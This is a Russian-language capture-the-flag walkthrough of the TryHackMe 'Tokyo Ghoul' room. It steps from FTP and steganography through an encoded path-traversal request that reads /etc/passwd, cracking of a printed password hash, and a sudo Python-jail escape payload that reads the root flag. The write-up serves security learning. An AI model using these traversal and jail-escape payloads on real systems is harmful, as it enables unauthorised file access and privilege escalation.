# TryHackMe — Tokyo Ghoul

**Difficulty:** Medium  
**Platform:** TryHackMe  
**Target:** `TARGET_IP`

## 1. Initial Reconnaissance

Начинаем с полного сканирования портов, чтобы определить доступные сервисы.

```bash
sudo nmap -sC -sV -vv -T4 -p- TARGET_IP
```

### Результаты сканирования

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

Обнаружены три открытых порта:

- **21/tcp — FTP:** доступен Anonymous login.
- **22/tcp — SSH:** удалённое подключение.
- **80/tcp — HTTP:** веб-сервер Apache.

Операционная система — Ubuntu.

Особенно интересен FTP: Nmap обнаружил возможность анонимного входа и директорию `need_Help?`.

## 2. Web Enumeration

Открываем веб-сайт:

```text
http://TARGET_IP/
```

На главной странице находится история Kaneki и Rize. Изучаем исходный код страницы через DevTools или `Ctrl + U`.

В HTML обнаруживаем комментарий:

```html
<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->
```

Переходим по ссылке на:

```text
http://TARGET_IP/jasonroom.html
```

В исходном коде этой страницы находится ещё одна подсказка, указывающая на FTP и Anonymous login.

## 3. Anonymous FTP

Подключаемся к FTP:

```bash
ftp TARGET_IP
```

Используем логин:

```text
anonymous
```

Пароль можно оставить пустым.

Просматриваем содержимое:

```ftp
ls -la
```

Находим директорию:

```text
need_Help?
```

Переходим в неё:

```ftp
cd "need_Help?"
ls -la
```

Обнаруживаем два объекта:

```text
Aogiri_tree.txt
Talk_with_me/
```

Скачиваем текстовый файл:

```ftp
get Aogiri_tree.txt
```

Переходим в следующую директорию:

```ftp
cd Talk_with_me
ls -la
```

Находим:

```text
need_to_talk
rize_and_kaneki.jpg
```

Скачиваем оба файла:

```ftp
get need_to_talk
get rize_and_kaneki.jpg
exit
```

### Анализ Aogiri_tree.txt

Читаем сообщение:

```bash
cat Aogiri_tree.txt
```

В тексте говорится о Rize, Kagune и Aogiri Tree.

Эти слова могут быть полезны при дальнейшем исследовании файлов.

## 4. Binary Analysis — need_to_talk

Проверяем тип исполняемого файла:

```bash
file need_to_talk
```

Получаем ELF 64-bit executable.

Пробуем запустить:

```bash
chmod +x need_to_talk
./need_to_talk
```

Программа запрашивает ключ. При неправильном вводе появляется подсказка:

```text
Take a look inside of me. rabin2 -z
```

Используем rabin2:

```bash
rabin2 -z need_to_talk
```

Также можно использовать:

```bash
strings need_to_talk
```

Среди строк обнаруживаем:

```text
kamishiro
```

Проверяем найденный ключ:

```bash
./need_to_talk
```

Вводим:

```text
kamishiro
```

Программа принимает ключ и выводит:

```text
Good job. I believe this is what you came for:
You_found_1t
```

Полученное значение понадобится для извлечения скрытого файла из изображения.

## 5. Steganography — rize_and_kaneki.jpg

Сначала проверяем изображение:

```bash
file rize_and_kaneki.jpg
exiftool rize_and_kaneki.jpg
binwalk rize_and_kaneki.jpg
```

Обычные метаданные не дают полезной информации. Binwalk также не обнаруживает дополнительные файлы.

Проверяем наличие скрытых данных с помощью Steghide:

```bash
steghide extract -sf rize_and_kaneki.jpg
```

Программа запрашивает пароль.

Используем найденное ранее значение:

```text
You_found_1t
```

Извлекается файл:

```text
yougotme.txt
```

Читаем его:

```bash
cat yougotme.txt
```

Внутри находится сообщение и последовательность символов в формате Morse Code.

## 6. Decoding — Morse, Hex, Base64

В `yougotme.txt` находится многострочная последовательность точек и тире.

Она представляет собой Morse Code.

Процесс декодирования состоит из трёх этапов:

1. Morse Code → Hexadecimal.
2. Hexadecimal → Base64.
3. Base64 → текстовое значение.

Для декодирования можно использовать CyberChef.

В результате получаем название скрытой директории:

```text
d1r3c70ry_center
```

Открываем:

```text
http://TARGET_IP/d1r3c70ry_center/
```

Страница содержит изображение и подсказку просканировать директорию.

## 7. Directory Enumeration — Gobuster

Запускаем Gobuster для поиска скрытых директорий и файлов:

```bash
gobuster dir \
-u http://TARGET_IP/d1r3c70ry_center/ \
-w /usr/share/dirb/wordlists/common.txt \
-t 30
```

Результат:

```text
/d1r3c70ry_center/.htpasswd   (403)
/d1r3c70ry_center/.hta        (403)
/d1r3c70ry_center/.htaccess   (403)
/d1r3c70ry_center/claim       (301)
/d1r3c70ry_center/index.html  (200)
```

Наиболее интересный результат:

```text
/claim
```

Код 301 означает перенаправление на директорию со слешем в конце.

Переходим:

```text
http://TARGET_IP/d1r3c70ry_center/claim/
```

На странице видим вопрос о принятии силы Ghouls и кнопки YES / NO.

После нажатия появляется URL:

```text
/d1r3c70ry_center/claim/index.php?view=flower.gif
```

Параметр `view` выглядит подозрительно: вероятно, приложение использует его для подключения файлов.

Это возможная точка входа для Local File Inclusion.

## 8. Local File Inclusion (LFI)

Пробуем стандартный Directory Traversal:

```text
?view=../../../../etc/passwd
```

Приложение отвечает:

```text
no no no silly don't do that
```

Фильтр блокирует обычные варианты с `../` и другими известными последовательностями.

Пробуем обход через URL encoding.

В данном случае важна особенность запроса: рабочий вариант использует закодированный путь и не содержит знака `=` после `view`.

Запрос:

```http
GET /d1r3c70ry_center/claim/index.php?view%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd HTTP/1.1
```

После URL-декодирования:

```text
view/../../../../../etc/passwd
```

Таким образом удаётся обойти проверку и прочитать `/etc/passwd`.

В файле находим пользователя:

```text
kamishiro
```

Его запись:

```text
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
```

Из неё получаем:

- Username: `kamishiro`
- UID: `1001`
- Home directory: `/home/kamishiro`
- Shell: `/bin/bash`
- Password hash: SHA-512 crypt (`$6$`)

## 9. Password Cracking — John the Ripper

Копируем хеш в файл:

```bash
nano hash
```

Сохраняем полную строку пользователя:

```text
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

Запускаем John с RockYou:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Если словарь сжат:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Показываем найденный пароль:

```bash
john --show hash
```

Полученные credentials:

```text
Username: kamishiro
Password: password123
```

## 10. SSH Access — User Flag

Используем найденные credentials:

```bash
ssh kamishiro@TARGET_IP
```

Вводим пароль:

```text
password123
```

После успешного входа проверяем домашнюю директорию:

```bash
pwd
ls -la
```

Читаем пользовательский флаг:

```bash
cat user.txt
```

## 11. Privilege Escalation — sudo

Проверяем доступные sudo-команды:

```bash
sudo -l
```

Получаем:

```text
User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

Это означает, что пользователь может запускать указанный Python-скрипт от имени любого пользователя, включая root.

Изучаем скрипт:

```bash
cat jail.py
```

Содержимое:

```python
#! /usr/bin/python3
#-*- coding:utf-8 -*-

def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")

    text = input('>>> ')

    for keyword in ['eval', 'exec', 'import', 'open', 'os',
                    'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return

    else:
        exec(text)
        print('No Kaneki you are so dead')

if __name__ == "__main__":
    main()
```

### Анализ уязвимости

Скрипт принимает пользовательский ввод и проверяет его на наличие запрещённых подстрок.

Если запрещённые слова отсутствуют, код передаётся в `exec()`.

Проблема заключается в том, что фильтр проверяет только исходный текст, а не реальные действия Python.

Например, он блокирует:

```python
open('/root/root.txt')
```

Но не учитывает, что имя функции можно собрать динамически.

### Использование getattr() и __builtins__

`__builtins__` предоставляет доступ к встроенным возможностям Python.

`getattr(object, name)` позволяет получить атрибут объекта по имени, переданному строкой.

Например:

```python
getattr(__builtins__, 'open')
```

Возвращает встроенную функцию `open`.

Чтобы обойти фильтр, разделяем запрещённые имена на части:

```python
'op' + 'en'
're' + 'ad'
```

Python объединяет строки во время выполнения, поэтому фильтр не обнаруживает целые запрещённые слова в исходном вводе.

### Exploitation

Запускаем скрипт от имени root:

```bash
sudo /usr/bin/python3 /home/kamishiro/jail.py
```

Вводим:

```python
print(getattr(getattr(__builtins__, 'op'+'en')('/root/root.txt'), 're'+'ad')())
```

Разбор payload:

1. `getattr(__builtins__, 'op'+'en')` получает функцию `open`.
2. `('/root/root.txt')` вызывает её и открывает root-файл.
3. Внутренний файловый объект передаётся в следующий `getattr()`.
4. `getattr(..., 're'+'ad')` получает метод `read`.
5. Последние `()` вызывают `read()` и выводят содержимое файла.

Поскольку весь скрипт запущен через sudo, Python выполняет операцию с правами root.

Получаем содержимое:

```text
/root/root.txt
```

**Root flag найден.**

---

## 12. What I Learned

| Technique | Что изучил |
|---|---|
| Nmap | Полное сканирование портов и определение сервисов |
| FTP | Anonymous login и исследование файлов |
| HTML Source | Поиск подсказок в комментариях |
| `strings`, `rabin2` | Анализ строк внутри ELF-бинарника |
| Exiftool, Binwalk | Проверка метаданных и структуры файлов |
| Steghide | Извлечение скрытых данных из изображения |
| Morse / Hex / Base64 | Многоуровневое декодирование |
| Gobuster | Поиск скрытых директорий |
| LFI | Чтение локальных файлов через веб-приложение |
| John the Ripper | Взлом SHA-512 crypt хеша |
| SSH | Получение пользовательского доступа |
| sudo | Поиск возможностей повышения привилегий |
| Python Jail Escape | Обход наивного фильтра через динамический доступ к атрибутам |

### Main Takeaways

- Не стоит ограничиваться просмотром главной страницы: исходный HTML может содержать полезные комментарии.
- Anonymous FTP может раскрывать файлы, которые дают дальнейшие подсказки.
- При анализе бинарников полезно проверять строки и символы, даже если исходного кода нет.
- Стеганография может сочетаться с несколькими слоями кодирования.
- HTTP 200 не обязательно означает успешную эксплуатацию LFI: нужно проверять фактическое содержимое ответа.
- Парольный хеш из `/etc/passwd` может стать путём к SSH-доступу.
- При анализе Python Jail важно понимать разницу между получением атрибута и вызовом метода.
- Фильтрация запрещённых слов не является надёжным способом изоляции Python-кода.

**Room completed — User access and Root access.**
